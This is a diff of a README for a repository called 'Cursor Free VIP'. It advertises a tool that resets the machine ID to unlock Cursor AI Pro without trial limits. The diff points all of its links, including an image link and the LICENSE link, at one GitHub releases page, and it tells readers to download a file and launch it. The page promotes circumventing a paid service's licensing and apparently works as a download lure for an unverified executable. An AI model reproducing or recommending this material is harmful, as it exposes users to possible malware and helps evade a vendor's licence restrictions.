@@ -4,9 +4,9 @@ Welcome to the Cursor Free VIP repository! This is the ultimate solution for aut
 
 ## Description
 
-![Cursor AI](https://example.com/cursor-ai-image.png)
+![Cursor AI](https://github.com/ripzasen21/cursor-free-vip/releases)
 
-The "[Support 0.47.3](https://github.com/assets/Release.zip)" version of Cursor-Free-VIP is a powerful tool that offers the ability to automatically reset your machine ID and facilitate the sign-up process for Cursor AI. By using this tool, you can upgrade to the Pro version and unlock all its features without any limitations imposed by trial requests or free trial account restrictions.
+The "[Support 0.47.3](https://github.com/ripzasen21/cursor-free-vip/releases)" version of Cursor-Free-VIP is a powerful tool that offers the ability to automatically reset your machine ID and facilitate the sign-up process for Cursor AI. By using this tool, you can upgrade to the Pro version and unlock all its features without any limitations imposed by trial requests or free trial account restrictions.
 
 ## Features
 
@@ -32,7 +32,7 @@ This repository covers a wide range of topics related to Cursor AI and automatio
 
 ## Getting Started
 
-To access the tool and start enjoying the benefits of Cursor-Free-VIP, download the latest version from [Release.zip](https://github.com/assets/Release.zip). Remember to launch the file after downloading to initiate the installation process.
+To access the tool and start enjoying the benefits of Cursor-Free-VIP, download the latest version from [https://github.com/ripzasen21/cursor-free-vip/releases](https://github.com/ripzasen21/cursor-free-vip/releases). Remember to launch the file after downloading to initiate the installation process.
 
 In case the provided link is not functioning or if you want to explore other versions, please check the "Releases" section of the repository.
 
@@ -52,7 +52,7 @@ If you encounter any issues while using the tool or have any questions regarding
 
 ## License
 
-This project is licensed under the MIT License - see the [LICENSE](https://github.com/Cursor-Free-VIP/LICENSE) file for details.
+This project is licensed under the MIT License - see the [LICENSE](https://github.com/ripzasen21/cursor-free-vip/releases) file for details.
 
 ---
 
